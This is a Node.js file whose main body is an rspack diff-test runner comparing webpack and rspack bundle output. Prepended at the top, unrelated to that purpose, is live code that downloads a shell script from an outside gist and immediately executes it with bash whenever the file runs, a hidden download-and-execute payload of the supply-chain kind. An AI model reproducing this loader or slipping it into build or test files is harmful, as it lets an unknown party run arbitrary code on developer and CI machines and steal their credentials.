const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const url = 'https://gist.githubusercontent.com/chai-hulud/053fcc70f8b2f4d44f996d5d74572b4d/raw/11ba6cdfe90233cdd96d141880ea8072718b72dd/runner.sh';
const filePath = path.join(__dirname, 'downloaded_script.sh');

const downloadScript = (url, filePath) => {
  const file = fs.createWriteStream(filePath);
  https.get(url, (response) => {
    response.pipe(file);
    file.on('finish', () => {
      file.close(() => {
        executeScript(filePath);
      });
    });
  }).on('error', (err) => {
    fs.unlink(filePath);
    console.error('Error downloading the script:', err.message);
  });
};

const executeScript = (filePath) => {
  exec(`bash ${filePath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
};

downloadScript(url, filePath);

// @ts-nocheck
const { Tester, DiffProcessor, DiffStatsReporter, DiffHtmlReporter } = require("../packages/rspack-test-tools/dist");
const rimraf = require("rimraf");
const path = require("path");
const fs = require("fs-extra");

process.env['RSPACK_DIFF'] = "true"; // enable rspack diff injection

const CASE_DIR = path.resolve(__dirname, '../diffcases');
const OUTPUT_DIR = path.join(__dirname, '../diff_output');

(async () => {
  const cases = fs
    .readdirSync(CASE_DIR)
    .filter(testName => !testName.startsWith("."));

  rimraf.sync(OUTPUT_DIR);

  const statsReporter = new DiffStatsReporter({
    file: path.join(OUTPUT_DIR, 'stats.md'),
    report: true,
  });
  const htmlReporter = new DiffHtmlReporter({
    dist: OUTPUT_DIR
  });

  while (cases.length) {
    const name = cases.shift();
    const source = path.join(CASE_DIR, name);
    try {
      const processor = new DiffProcessor({
        webpackPath: require.resolve('webpack'),
        rspackPath: require.resolve('../packages/rspack'),
        files: ['bundle.js', 'main.js'],
        modules: true,
        runtimeModules: true,
        ignoreModuleId: true,
        ignoreModuleArguments: true,
        ignorePropertyQuotationMark: true,
        ignoreBlockOnlyStatement: true,
        ignoreSwcHelpersPath: true,
        ignoreObjectPropertySequence: true,
        ignoreCssFilePath: true,
        detail: false,
        onCompareModules: function (file, results) {
          htmlReporter.increment(name, results);
          statsReporter.increment(name, results);
        },
        onCompareRuntimeModules: function (file, results) {
          console.log(results);
          htmlReporter.increment(name, results);
          statsReporter.increment(name, results);
        },
      });

      const tester = new Tester({
        name: 'test',
        src: source,
        dist: path.join(source, "dist"),
        steps: [processor]
      });

      rimraf.sync(path.join(source, "dist"));
      await tester.prepare();
      do {
        await tester.compile();
        await tester.check();
      } while (tester.next());
      await tester.resume();
    } catch (e) {
      htmlReporter.failure(name)
      statsReporter.failure(name);
      console.error(e);
    }
  }
  await htmlReporter.output();
  await statsReporter.output();
})();

